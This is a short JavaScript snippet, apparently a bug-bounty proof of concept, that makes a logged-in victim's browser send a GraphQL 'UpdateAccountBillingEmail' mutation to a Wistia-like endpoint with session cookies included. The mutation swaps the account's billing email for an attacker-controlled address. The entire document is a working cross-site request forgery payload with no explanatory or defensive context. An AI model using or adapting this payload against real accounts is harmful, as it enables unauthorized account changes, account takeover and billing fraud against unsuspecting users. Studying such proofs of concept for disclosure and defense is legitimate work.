(function() {
  var data = {
    operationName: "UpdateAccountBillingEmail",
    variables: {
      input: {
        billingEmail: "attacker+poctest@gmail.com"
      }
    },
    query: `mutation UpdateAccountBillingEmail($input: UpdateAccountBillingEmailInput!) {
      updateAccountBillingEmail(input: $input) {
        account {
          id
          __typename
        }
        __typename
      }
    }`
  };

  fetch("https://aa.wistia.st/graphql?op=UpdateAccountBillingEmail", {
    method: "POST",
    credentials: "include", // send session cookies
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  })
  .then(response => response.text())
  .then(result => {
    alert("Billing email updated successfully!");
  })
  .catch(error => {
    alert("Error: " + error);
  });
})();
